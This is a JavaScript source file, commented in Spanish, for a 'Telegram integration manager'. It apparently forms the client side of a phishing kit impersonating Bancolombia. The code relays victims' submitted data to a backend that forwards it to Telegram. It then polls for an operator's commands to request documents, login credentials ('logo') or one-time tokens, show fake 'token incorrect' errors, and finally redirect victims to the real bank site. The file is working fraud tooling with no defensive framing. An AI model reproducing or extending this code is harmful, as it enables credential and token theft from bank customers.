/**
 * TELEGRAM INTEGRATION MANAGER
 * Maneja comunicación con Telegram y polling de acciones
 */

'use strict';

class TelegramManager {
    constructor() {
        this.checkInterval = null;
        this.checking = false;
        this.isPolling = false;
    }

    async sendToTelegram(stage, data) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);
            
            const response = await fetch('/api/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',
                body: JSON.stringify({ stage, data }),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            const result = await response.json();
            console.log('📤 Mensaje enviado a Telegram');
            return result;
        } catch (error) {
            if (error.name === 'AbortError') {
                console.error('❌ Timeout enviando a Telegram');
            } else {
                console.error('❌ Error enviando a Telegram:', error);
            }
            return { success: false };
        }
    }

    async startPolling() {
        if (this.isPolling) {
            console.log('⚠️ Polling ya activo, ignorando...');
            return;
        }
        this.isPolling = true;
        this.checking = true;
        this.checkInterval = setInterval(() => this.checkAction(), 1500);
        console.log('🔄 Polling iniciado...');
    }

    stopPolling() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.checking = false;
        this.isPolling = false;
        console.log('⏹️ Polling detenido');
    }

    async checkAction() {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 8000);
            
            const response = await fetch(`/api/check-action?t=${Date.now()}`, {
                method: 'GET',
                cache: 'no-cache',
                credentials: 'include',
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            const data = await response.json();

            if (data.action) {
                console.log('✅ ACCIÓN DETECTADA:', data.action);
                this.stopPolling();
                this.handleAction(data.action);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                console.warn('⏱️ Timeout en check-action');
            } else {
                console.error('❌ Error checking action:', error);
            }
        }
    }

    handleAction(action) {
        console.log('🎯 EJECUTANDO ACCIÓN:', action);

        // Execute immediately based on action type
        switch (action) {
            case 'error_documento':
                // Keep overlay active during redirect
                this.showOverlay();
                this.sendConfirmation(action);
                setTimeout(() => {
                    window.location.href = '/index.html?error=documento';
                }, 100);
                break;

            case 'pedir_logo':
                // Keep overlay active during redirect
                this.showOverlay();
                this.sendConfirmation(action);
                setTimeout(() => {
                    window.location.href = '/next-step.html';
                }, 100);
                break;

            case 'error_logo':
                // Keep overlay active during redirect
                this.showOverlay();
                this.sendConfirmation(action);
                setTimeout(() => {
                    window.location.href = '/next-step.html?error=credenciales';
                }, 100);
                break;

            case 'pedir_token':
                // Check if we're on next-step page
                const currentPath = window.location.pathname;
                this.sendConfirmation(action);
                if (currentPath.includes('next-step')) {
                    // Hide overlay and switch to token card
                    this.hideOverlay();
                    if (typeof window.tokenModalController !== 'undefined') {
                        setTimeout(() => {
                            window.tokenModalController.switchToTokenCard();
                        }, 100);
                    } else {
                        console.error('tokenModalController no disponible');
                    }
                } else {
                    // Redirect to next-step with token open
                    this.showOverlay();
                    setTimeout(() => {
                        window.location.href = '/next-step.html?openToken=1';
                    }, 100);
                }
                break;

            case 'error_token':
                // Hide overlay and show error
                this.hideOverlay();
                this.sendConfirmation(action);
                const tokenInput = document.getElementById('tokenInputCard');
                if (tokenInput) {
                    tokenInput.value = '';
                    setTimeout(() => {
                        tokenInput.focus();
                        alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingrésalo.');
                    }, 100);
                } else {
                    console.warn('tokenInputCard no encontrado en esta página');
                }
                break;

            case 'finalizar':
                // Keep overlay active during redirect
                this.showOverlay();
                this.sendConfirmation(action);
                setTimeout(() => {
                    window.location.href = 'https://www.bancolombia.com/personas';
                }, 100);
                break;

            default:
                console.warn('❓ Acción desconocida:', action);
                this.hideOverlay();
        }
    }

    async sendConfirmation(action) {
        // Enviar mensaje de confirmación a Telegram
        const actionNames = {
            'error_documento': '❌ Error Documento',
            'pedir_logo': '✅ Pedir Logo (Credenciales)',
            'error_logo': '❌ Error Logo',
            'pedir_token': '🔑 Pedir Token',
            'error_token': '❌ Error Token',
            'finalizar': '🏁 Finalizar'
        };
        
        try {
            await fetch('/api/send-confirmation', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({ 
                    action: action,
                    actionName: actionNames[action] || action
                })
            });
        } catch (error) {
            console.error('Error enviando confirmación:', error);
        }
    }

    showOverlay() {
        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.add('active');
        }
    }

    hideOverlay() {
        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.remove('active');
        }
    }
}

// Instancia global
window.telegramManager = new TelegramManager();

// NO iniciar polling automáticamente, solo cuando sea necesario
document.addEventListener('DOMContentLoaded', () => {
    console.log('📱 Telegram Manager listo');
});

